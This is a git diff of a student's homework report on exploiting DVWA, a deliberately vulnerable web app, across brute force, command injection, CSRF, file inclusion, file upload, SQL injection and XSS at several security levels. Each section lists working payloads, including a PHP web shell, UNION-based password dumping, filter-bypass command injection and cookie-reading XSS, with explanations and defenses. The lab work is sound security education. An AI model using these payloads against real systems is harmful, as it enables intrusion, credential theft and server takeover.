@@ -1,149 +1,408 @@
-# Cybersecurity Lab: Vulnerability Analysis & Exploitation
+# Cybersecurity Homework – DVWA Vulnerabilities
+
 # Ikramah Elahi (ie08941)
 
----
+## Brute Force
 
-## 1. Brute Force
-### [LOW]
-* **Payload Used:** `username = admin' OR '1'='1`
-* **Result:** Login Successful.
-* **Why it worked:** The login form lacks input sanitization. By injecting `OR '1'='1'`, the SQL query evaluates to true, bypassing password verification.
-* **Why it failed at higher level:** Higher levels implement input cleaning/parameterization, neutralizing SQL syntax tricks.
+### LOW
+**Payload Used:**  
+`username = admin' OR '1'='1`
 
-### [MEDIUM]
-* **Payload Used:** `http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login..."`
-* **Result:** Login Successful via Hydra.
-* **Why it worked:** The system allowed rapid, automated attempts. A weak password ("password") was easily found using a common wordlist.
-* **Why it failed at higher level:** Introduction of account lockouts, rate limiting, and sleep delays makes automation impractical.
+**Result:**  
+Login successful.  
+![login1](cybersechw2imgs/login1.png)
 
----
+**Why it worked:**  
+The login form does not properly validate input. The payload makes the SQL query always true.
 
-## 2. Command Injection
-### [LOW]
-* **Payload Used:** `127.0.0.1; ls`
-* **Result:** Listed server files.
-* **Why it worked:** The application concatenates user input directly into a shell command. The `;` acts as a command separator.
-* **Why it failed at higher level:** Special characters like `;` are blacklisted.
-
-### [MEDIUM]
-* **Payload Used:** `asda || ls`
-* **Result:** Executed `ls` after a failed ping.
-* **Why it worked:** The `||` operator executes the second command if the first fails. Since "asda" isn't a valid IP, the shell moved to the next command.
-* **Why it failed at higher level:** Logical operators (`||`, `&&`) are filtered out.
-
-### [HIGH]
-* **Payload Used:** `|ls`
-* **Result:** System files listed.
-* **Why it worked:** The filter specifically looked for `| ` (pipe with a space). Removing the space bypassed the logic.
-* **Why it failed at higher level:** Strict validation (regex) only allows numeric IP formats.
+**Why it failed at higher level:**  
+Higher security levels sanitize input before it reaches the database.
 
 ---
 
-## 3. CSRF (Cross-Site Request Forgery)
-### [LOW]
-* **Payload Used:** `http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change`
-* **Result:** Admin password changed via link.
-* **Why it worked:** No origin checking. If a logged-in admin clicks the URL, the browser sends the session cookie automatically.
-* **Why it failed at higher level:** Implementation of Anti-CSRF tokens or SameSite cookie attributes.
+### MEDIUM
+**Payload Used:**  
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt`
+
+**Result:**  
+Correct password discovered through brute force.  
+![login2](cybersechw2imgs/login2.png)
+
+**Why it worked:**  
+The account used a weak password that exists in common password lists.
+
+**Why it failed at higher level:**  
+Higher security adds delays and protection mechanisms against automated login attempts.
 
 ---
 
-## 4. File Inclusion (LFI/RFI)
-### [LOW]
-* **Payload Used:** `page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/hackable/flags/fi.php`
-* **Result:** Hidden PHP source code revealed.
-* **Why it worked:** The PHP `include()` function accepts arbitrary paths, allowing directory traversal.
+## Command Injection
 
-### [MEDIUM]
-* **Payload Used:** `page=....//....//....//....//var/www/html/hackable/flags/fi.php`
-* **Result:** Sensitive file accessed.
-* **Why it worked:** The filter performed a non-recursive replacement of `../`. Nesting them (`....//`) resulted in a valid path after the first pass.
+### LOW
+**Payload Used:**  
+`127.0.0.1; ls`
 
-### [HIGH]
-* **Payload Used:** `page=file:///var/www/html/hackable/flags/fi.php`
-* **Result:** File contents viewed.
-* **Why it worked:** The use of the `file://` protocol bypassed basic string filters.
-* **Why it failed at higher level:** The application uses an "Allow List" of specific filenames.
+**Result:**  
+Server files were listed.  
+![cmd1](cybersechw2imgs/cmd1.png)
 
----
+**Why it worked:**  
+The application executes user input directly in a system command.
 
-## 5. File Upload
-### [LOW]
-* **Payload Used:** `cyber.php` containing `<?php system($_REQUEST["cmd"]); ?>`
-* **Result:** Remote Code Execution (RCE) achieved.
-* **Why it worked:** No file extension or MIME-type validation.
-
-### [MEDIUM]
-* **Payload Used:** Intercepted request via Curl/Burp: `type=image/jpeg`
-* **Result:** Malicious PHP file uploaded successfully.
-* **Why it worked:** The server trusted the `Content-Type` header provided by the client, which is easily spoofed.
-* **Why it failed at higher level:** The server validates the actual file signatures (magic bytes) and checks image dimensions.
+**Why it failed at higher level:**  
+Higher security filters dangerous characters such as `;`.
 
 ---
 
-## 6. SQL Injection
-### [LOW]
-* **Payload Used:** `0' UNION SELECT first_name, password FROM users #`
-* **Result:** Dumped user database.
-* **Why it worked:** Direct concatenation of input into the query string.
+### MEDIUM
+**Payload Used:**  
+`asda || ls`
 
-### [MEDIUM]
-* **Payload Used:** Updated value in dropdown: `1 OR 1=1`
-* **Result:** All credentials retrieved.
-* **Why it worked:** Lack of server-side validation on POST parameters.
+**Result:**  
+Command executed and files listed.  
+![cmd2](cybersechw2imgs/cmd2.png)
 
-### [HIGH]
-* **Payload Used:** `0' UNION SELECT first_name, password FROM users #`
-* **Result:** Data leaked.
-* **Why it worked:** The limit on input was only enforced on the UI/client-side.
-* **Why it failed at higher level:** Use of Prepared Statements (Parameterized Queries).
+**Why it worked:**  
+`||` executes the second command when the first command fails.
+
+**Why it failed at higher level:**  
+Higher levels filter command operators.
 
 ---
 
-## 7. Cross-Site Scripting (XSS)
+### HIGH
+**Payload Used:**  
+`|ls`
 
-### DOM-Based
-* **High Payload:** `...default=English#<script>alert(document.cookie)</script>`
-* **Why it worked:** The fragment identifier (`#`) isn't sent to the server, so server-side filters never see the script, but the browser executes it.
+**Result:**  
+Files from the server were displayed.  
+![cmd3](cybersechw2imgs/cmd3.png)
 
-### Reflected
-* **Medium Payload:** `<img src="x" onerror=alert(1)>`
-* **Why it worked:** The developer only blacklisted `<script>` tags; other event handlers (like `onerror`) remained functional.
+**Why it worked:**  
+The filter only blocked `|` with a space, so `|ls` bypassed it.
 
-### Stored
-* **Mechanism:** The script is saved to the database (e.g., in a guestbook) and executes every time a user views the page.
-* **Mitigation:** Output encoding (converting `<` to `&lt;`) prevents the browser from interpreting data as code.
+**Why it failed at higher level:**  
+Stronger validation only allows valid IP input.
 
 ---
 
-## Security Analysis & Conclusions
+## CSRF
+
+### LOW
+**Payload Used:**  
+`http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change`
+
+**Result:**  
+User password changed successfully.  
+![csrf1](cybersechw2imgs/csrf1.png)
+
+**Why it worked:**  
+The site does not verify the source of the request.
+
+**Why it failed at higher level:**  
+Higher security uses tokens to verify legitimate requests.
+
+---
+
+## File Inclusion
+
+### LOW
+**Payload Used:**  
+`php://filter/convert.base64-encode/resource=../../../../../var/www/html/hackable/flags/fi.php`
+
+**Result:**  
+Sensitive file contents revealed.  
+![fileinc1](cybersechw2imgs/fileinc1.png)
+
+**Why it worked:**  
+The application allows unrestricted file paths.
+
+**Why it failed at higher level:**  
+Higher security validates allowed file locations.
+
+---
+
+### MEDIUM
+**Payload Used:**  
+`....//....//....//....//....//var/www/html/hackable/flags/fi.php`
+
+**Result:**  
+Sensitive file contents displayed.  
+![fileinc2](cybersechw2imgs/fileinc2.png)
+
+**Why it worked:**  
+The filter only removed `../` once, allowing bypass.
+
+**Why it failed at higher level:**  
+Improved path validation blocks traversal attempts.
+
+---
+
+### HIGH
+**Payload Used:**  
+`file:///var/www/html/hackable/flags/fi.php`
+
+**Result:**  
+File contents displayed in the browser.  
+![fileinc3](cybersechw2imgs/fileinc3.png)
+
+**Why it worked:**  
+The browser loaded the local file using the `file://` protocol.
+
+**Why it failed at higher level:**  
+The system restricts allowed files to a predefined list.
+
+---
+
+## File Upload
+
+### LOW
+**Payload Used:**
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+**Result:**  
+Malicious PHP file uploaded and executed.  
+![fileup1a](cybersechw2imgs/fileup1a.png)  
+![fileup1b](cybersechw2imgs/fileup1b.png)
+
+**Why it worked:**  
+The server does not check file type or contents.
+
+**Why it failed at higher level:**  
+Later levels verify file type before upload.
+
+---
+
+### MEDIUM
+**Payload Used:**  
+Upload request modified with `type=image/jpeg`.
+
+**Result:**  
+File successfully uploaded and executed.  
+![fileup2a](cybersechw2imgs/fileup2a.png)  
+![fileup2b](cybersechw2imgs/fileup2b.png)
+
+**Why it worked:**  
+The server trusted the file type in the request header.
+
+**Why it failed at higher level:**  
+Higher security checks the actual file contents.
+
+---
+
+## SQL Injection
+
+### LOW
+**Payload Used:**  
+`0' UNION SELECT first_name, password FROM users #`
+
+**Result:**  
+All usernames and passwords displayed.  
+![sql1](cybersechw2imgs/sql1.png)
+
+**Why it worked:**  
+User input was directly inserted into the SQL query.
+
+**Why it failed at higher level:**  
+Input validation prevents query manipulation.
+
+---
+
+### MEDIUM
+**Payload Used:**  
+Modified dropdown value to `1 OR 1=1`.
+
+**Result:**  
+Database returned all user records.  
+![sql2a](cybersechw2imgs/sql2a.png)  
+![sql2b](cybersechw2imgs/sql2b.png)
+
+**Why it worked:**  
+POST request values were not validated.
+
+**Why it failed at higher level:**  
+Input is restricted to numeric values.
+
+---
+
+### HIGH
+**Payload Used:**  
+`0' UNION SELECT first_name, password FROM users #`
+
+**Result:**  
+User credentials retrieved.  
+![sql3](cybersechw2imgs/sql3.png)
+
+**Why it worked:**  
+Improper filtering allowed SQL query manipulation.
+
+**Why it failed at higher level:**  
+Strict numeric validation prevents injection.
+
+---
+
+## XSS (DOM)
+
+### LOW
+**Payload Used:**  
+Injected script in URL parameter.
+
+**Result:**  
+Browser displayed cookie in alert.  
+![xssdom1](cybersechw2imgs/xssdom1.png)
+
+**Why it worked:**  
+Input from the URL was not validated.
+
+**Why it failed at higher level:**  
+Only predefined values are allowed.
+
+---
+
+### MEDIUM
+**Payload Used:**  
+Same payload.
+
+**Result:**  
+Cookie displayed in alert.  
+![xssdom2](cybersechw2imgs/xssdom2.png)
+
+**Why it worked:**  
+Filter only blocked `<script>` tags.
+
+**Why it failed at higher level:**  
+Stronger validation blocks injected HTML.
+
+---
+
+### HIGH
+**Payload Used:**  
+Script after URL fragment.
+
+**Result:**  
+Alert executed.  
+![xssdom3](cybersechw2imgs/xssdom3.png)
+
+**Why it worked:**  
+The browser processed the fragment even though the server ignored it.
+
+**Why it failed at higher level:**  
+Browser encoding prevents execution.
+
+---
+
+## XSS (Reflected)
+
+### LOW
+**Payload Used:**  
+`<script>alert(document.cookie)</script>`
+
+**Result:**  
+Cookies displayed.  
+![xssref1](cybersechw2imgs/xssref1.png)
+
+**Why it worked:**  
+Input reflected directly on the page.
+
+**Why it failed at higher level:**  
+Script tags are filtered.
+
+---
+
+### MEDIUM
+**Payload Used:**  
+`<img src="x" onerror=alert(document.cookie)>`
+
+**Result:**  
+Cookies displayed.  
+![xssref2](cybersechw2imgs/xssref2.png)
+
+**Why it worked:**  
+The filter only blocked script tags.
+
+**Why it failed at higher level:**  
+Special characters are encoded.
+
+---
+
+### HIGH
+**Payload Used:**  
+`<img src="x" onerror=alert(document.cookie)>`
+
+**Result:**  
+Cookies displayed.  
+![xssref3a](cybersechw2imgs/xssref3a.png)  
+![xssref3b](cybersechw2imgs/xssref3b.png)
+
+**Why it worked:**  
+Other HTML elements could still execute JavaScript.
+
+**Why it failed at higher level:**  
+Output encoding blocks script execution.
+
+---
+
+## XSS (Stored)
+
+### LOW
+**Payload Used:**  
+`<script>alert("XSS")</script>`
+
+**Result:**  
+Alert popup appears when visiting the page.  
+![xssstor1](cybersechw2imgs/xssstor1.png)
+
+**Why it worked:**  
+The script was stored in the database and executed when displayed.
+
+**Why it failed at higher level:**  
+Special characters are encoded before display.
+
+---
+
+### MEDIUM
+**Payload Used:**  
+Same payload.
+
+**Result:**  
+Alert popup appears.  
+![xssstor2](cybersechw2imgs/xssstor2.png)
+
+---
+
+### HIGH
+**Payload Used:**  
+Same payload.
+
+**Result:**  
+Alert popup appears.  
+![xssstor3](cybersechw2imgs/xssstor3.png)
+
+---
+
+# Security Analysis
 
 ### Why does SQL Injection succeed at Low security?
-The application lacks **input sanitization** and **parameterization**. It treats user input as executable code, allowing attackers to manipulate the structure of database queries.
+At low security, the application does not validate or sanitize user input before using it in SQL queries.
 
 ### What control prevents it at High?
-**Prepared Statements** (Parameterized Queries) are the primary defense. They ensure the database treats input strictly as data, never as code. Additionally, strict input validation (e.g., ensuring a User ID is only an integer) prevents unexpected characters from entering the logic.
+High security levels enforce input validation and restrict queries to safe formats.
 
 ### Does HTTPS prevent these attacks?
-**No.** HTTPS only protects "data in transit" from eavesdropping (Man-in-the-Middle). It does not validate the *content* of the data. An attacker can send a malicious payload over a secure, encrypted HTTPS connection just as easily as an unencrypted one.
+No. HTTPS encrypts communication but does not protect against vulnerabilities in the application itself.
 
-### Risks of Public Deployment
-* **Data Breach:** Unauthorized access to PII (Personally Identifiable Information).
-* **RCE:** Total server takeover via Command Injection or File Upload.
-* **Reputational Damage:** Defacement of the site via XSS.
-* **Lateral Movement:** Using the compromised server to attack internal networks.
+### What risks exist if this application is deployed publicly?
+Attackers could steal sensitive data, modify database records, upload malicious files, or take control of user accounts.
 
----
-
-## OWASP Top 10 Mapping (2021)
-
-| Vulnerability | OWASP Category |
-| :--- | :--- |
-| Brute Force | A07:2021 – Identification and Authentication Failures |
-| Command Injection | A03:2021 – Injection |
-| CSRF | A01:2021 – Broken Access Control |
-| File Inclusion | A03:2021 – Injection |
-| File Upload | A04:2021 – Insecure Design |
-| SQL Injection | A03:2021 – Injection |
-| XSS (All types) | A03:2021 – Injection |
-| Weak Session IDs | A07:2021 – Identification and Authentication Failures |
+### OWASP Top 10 Mapping
+- Brute Force → A2 – Broken Authentication  
+- Command Injection → A1 – Injection  
+- CSRF → A5 – Security Misconfiguration  
+- File Inclusion → A1 – Injection  
+- File Upload → A5 – Security Misconfiguration  
+- SQL Injection → A1 – Injection  
+- XSS (DOM) → A3 – Cross Site Scripting  
+- XSS (Reflected) → A3 – Cross Site Scripting  
+- XSS (Stored) → A3 – Cross Site Scripting
